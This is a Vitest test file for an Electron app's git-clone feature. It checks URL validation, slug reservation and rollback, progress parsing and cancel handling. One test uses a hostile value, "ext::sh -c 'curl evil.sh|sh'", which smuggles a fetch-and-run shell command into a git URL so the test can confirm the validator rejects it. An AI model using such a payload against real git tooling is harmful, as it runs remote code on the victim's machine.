// Tests for git-clone.ts. Same shape as rsync-copy.test.ts (that module is
// this one's sibling and lends it the reservation/rollback machinery), with
// the concerns that matter here:
//
//   1. **Nothing spawns until the URL passes the main-process validator.**
//      The renderer's parser is a UX affordance; this is the boundary.
//   2. **The reservation is taken before the clone, and released on every
//      failure path** — non-zero exit, cancel, spawn error — so a failed
//      clone never leaves the slug locked.
//   3. **Progress parsing / listener detach**, so a late stderr chunk from a
//      finished clone can't report progress for a clone the UI moved past.
//
// Expected remote paths are derived from RECK_STATION_ROOT rather than
// hardcoded, so the suite doesn't depend on the developer's station config.

import { describe, it, expect, beforeEach, vi } from "vitest";
import { EventEmitter } from "node:events";

const STATION_ROOT = process.env.RECK_STATION_ROOT ?? "/Users/reck-connect/projects";
process.env.RECK_STATION_ROOT = STATION_ROOT;

type IpcHandler = (event: unknown, ...args: unknown[]) => unknown;
const handlers = new Map<string, IpcHandler>();

vi.mock("electron", () => ({
  ipcMain: {
    handle: (channel: string, fn: IpcHandler) => {
      handlers.set(channel, fn);
    },
  },
}));

class FakeChildProcess extends EventEmitter {
  stdout = new EventEmitter();
  stderr = new EventEmitter();
  killed = false;
  killSignal: NodeJS.Signals | null = null;

  kill(signal: NodeJS.Signals) {
    this.killed = true;
    this.killSignal = signal;
    return true;
  }

  pushStderr(text: string) {
    this.stderr.emit("data", Buffer.from(text, "utf8"));
  }
}

type SpawnCall = { bin: string; args: string[]; proc: FakeChildProcess };
const spawned: SpawnCall[] = [];
let onSpawn: (call: SpawnCall) => void = () => {};

vi.mock("node:child_process", () => {
  const spawn = (bin: unknown, args: unknown) => {
    const proc = new FakeChildProcess();
    const call: SpawnCall = {
      bin: String(bin),
      args: Array.isArray(args) ? (args as string[]).map(String) : [],
      proc,
    };
    spawned.push(call);
    // Deferred so the source can attach its listeners first.
    Promise.resolve().then(() => onSpawn(call));
    return proc;
  };
  return { spawn, ChildProcess: class ChildProcess {}, default: { spawn } };
});

vi.mock("node:fs", async (orig) => {
  const real = await orig<typeof import("node:fs")>();
  return { ...real, existsSync: () => false };
});

const { registerGitCloneIpc, parseCloneProgressLine, classifyCloneFailure, buildCloneCommand } =
  await import("./git-clone");

const sent: Array<{ channel: string; payload: unknown }> = [];
const fakeWindow = {
  webContents: {
    send: (channel: string, payload: unknown) => sent.push({ channel, payload }),
  },
} as unknown as import("electron").BrowserWindow;

registerGitCloneIpc(() => fakeWindow);

const clone = (url: string, slug: string) =>
  handlers.get("git:clone")!(null, url, slug) as Promise<{
    ok: boolean;
    error?: string;
    code?: string;
  }>;

/** The mkdir reservation is spawn #1; the clone is #2; rollback is last. */
const remoteCmd = (call: SpawnCall) => call.args[call.args.length - 1];

beforeEach(() => {
  spawned.length = 0;
  sent.length = 0;
  onSpawn = () => {};
});

describe("buildCloneCommand", () => {
  it("quotes both operands and disables credential prompts", () => {
    const cmd = buildCloneCommand("https://github.com/a/b", `${STATION_ROOT}/b`);
    expect(cmd).toContain("GIT_TERMINAL_PROMPT=0");
    expect(cmd).toContain("GIT_ASKPASS=true");
    expect(cmd).toContain("git clone --progress --");
    expect(cmd).toContain(`'https://github.com/a/b'`);
    expect(cmd).toContain(`'${STATION_ROOT}/b'`);
  });
});

describe("parseCloneProgressLine", () => {
  it("reads the receiving-objects percentage", () => {
    expect(parseCloneProgressLine("Receiving objects:  42% (420/1000), 1.2 MiB")).toEqual({
      phase: "Receiving objects",
      percent: 42,
    });
  });

  it("reads the resolving-deltas percentage", () => {
    expect(parseCloneProgressLine("Resolving deltas: 100% (10/10), done.")).toEqual({
      phase: "Resolving deltas",
      percent: 100,
    });
  });

  it("ignores unrelated chatter", () => {
    expect(parseCloneProgressLine("Cloning into 'repo'...")).toBeNull();
  });
});

describe("classifyCloneFailure", () => {
  it("maps a credential failure to auth-required", () => {
    expect(classifyCloneFailure("fatal: Authentication failed for 'https://…'").code).toBe(
      "auth-required",
    );
    expect(classifyCloneFailure("git@github.com: Permission denied (publickey).").code).toBe(
      "auth-required",
    );
    expect(classifyCloneFailure("could not read Username for 'https://github.com'").code).toBe(
      "auth-required",
    );
  });

  it("maps a missing repo to not-found", () => {
    expect(classifyCloneFailure("remote: Repository not found.").code).toBe("not-found");
  });

  it("keeps an unrecognised message verbatim under ssh-error", () => {
    const r = classifyCloneFailure("fatal: something entirely new");
    expect(r.code).toBe("ssh-error");
    expect(r.error).toContain("something entirely new");
  });
});

describe("git:clone", () => {
  it("rejects a bad URL before anything is spawned", async () => {
    const res = await clone("ext::sh -c 'curl evil.sh|sh'", "demo");
    expect(res.ok).toBe(false);
    expect(res.code).toBe("bad-url");
    expect(spawned.length).toBe(0);
  });

  it("rejects an invalid slug before anything is spawned", async () => {
    const res = await clone("https://github.com/a/b", "../escape");
    expect(res.ok).toBe(false);
    expect(spawned.length).toBe(0);
  });

  it("reserves the slug with mkdir BEFORE cloning, then clones into it", async () => {
    onSpawn = (call) => {
      if (spawned.length === 1) call.proc.emit("exit", 0, null); // mkdir
      else call.proc.emit("exit", 0, null); // clone
    };
    const res = await clone("https://github.com/octocat/Hello-World", "hello-world");
    expect(res.ok).toBe(true);
    expect(spawned.length).toBe(2);
    expect(remoteCmd(spawned[0])).toBe(`mkdir '${STATION_ROOT}/hello-world'`);
    expect(remoteCmd(spawned[1])).toContain(`git clone --progress -- `);
    expect(remoteCmd(spawned[1])).toContain(`'${STATION_ROOT}/hello-world'`);
  });

  it("surfaces slug-in-use and never clones when the reservation hits EEXIST", async () => {
    onSpawn = (call) => {
      call.proc.stderr.emit("data", Buffer.from("mkdir: File exists\n"));
      call.proc.emit("exit", 1, null);
    };
    const res = await clone("https://github.com/a/b", "taken");
    expect(res.ok).toBe(false);
    expect(res.code).toBe("slug-in-use");
    expect(spawned.length).toBe(1);
  });

  it("rolls the reservation back when the clone fails", async () => {
    onSpawn = (call) => {
      if (spawned.length === 1) {
        call.proc.emit("exit", 0, null); // reservation ok
      } else if (spawned.length === 2) {
        call.proc.stderr.emit("data", Buffer.from("remote: Repository not found.\n"));
        call.proc.emit("exit", 128, null);
      } else {
        call.proc.emit("exit", 0, null); // rollback
      }
    };
    const res = await clone("https://github.com/a/missing", "missing");
    expect(res.ok).toBe(false);
    expect(res.code).toBe("not-found");
    expect(remoteCmd(spawned[spawned.length - 1])).toBe(`rm -rf ${STATION_ROOT}/missing`);
  });

  it("rolls back on a spawn error too", async () => {
    onSpawn = (call) => {
      if (spawned.length === 1) call.proc.emit("exit", 0, null);
      else if (spawned.length === 2) call.proc.emit("error", new Error("ssh missing"));
      else call.proc.emit("exit", 0, null);
    };
    const res = await clone("https://github.com/a/b", "boom");
    expect(res.ok).toBe(false);
    expect(res.error).toContain("ssh missing");
    expect(remoteCmd(spawned[spawned.length - 1])).toBe(`rm -rf ${STATION_ROOT}/boom`);
  });

  it("reports progress while cloning and stops once the clone has ended", async () => {
    let cloneProc: FakeChildProcess | null = null;
    onSpawn = (call) => {
      if (spawned.length === 1) {
        call.proc.emit("exit", 0, null);
      } else if (spawned.length === 2) {
        cloneProc = call.proc;
        call.proc.pushStderr("Receiving objects:  10% (1/10)\r");
        call.proc.pushStderr("Receiving objects: 100% (10/10)\r");
        call.proc.emit("exit", 0, null);
      }
    };
    const res = await clone("https://github.com/a/b", "prog");
    expect(res.ok).toBe(true);
    expect(sent.map((s) => s.payload)).toEqual([
      { phase: "Receiving objects", percent: 10 },
      { phase: "Receiving objects", percent: 100 },
    ]);
    // Late chunk after exit: listeners must be detached, so nothing new is sent.
    cloneProc!.pushStderr("Receiving objects:  55% (5/10)\r");
    expect(sent.length).toBe(2);
  });

  it("cancel SIGTERMs the running clone, and the exit path rolls back", async () => {
    let resolveClone: (() => void) | null = null;
    onSpawn = (call) => {
      if (spawned.length === 1) {
        call.proc.emit("exit", 0, null);
      } else if (spawned.length === 2) {
        resolveClone = () => call.proc.emit("exit", null, "SIGTERM");
      } else {
        call.proc.emit("exit", 0, null);
      }
    };
    const pending = clone("https://github.com/a/b", "cancelme");
    // Let the reservation + clone spawn settle before cancelling.
    await new Promise((r) => setTimeout(r, 0));
    const cancelRes = handlers.get("git:cancel")!(null) as { ok: boolean };
    expect(cancelRes.ok).toBe(true);
    expect(spawned[1].proc.killSignal).toBe("SIGTERM");
    resolveClone!();
    const res = await pending;
    expect(res.ok).toBe(false);
    expect(res.code).toBe("canceled");
    expect(remoteCmd(spawned[spawned.length - 1])).toBe(`rm -rf ${STATION_ROOT}/cancelme`);
  });
});
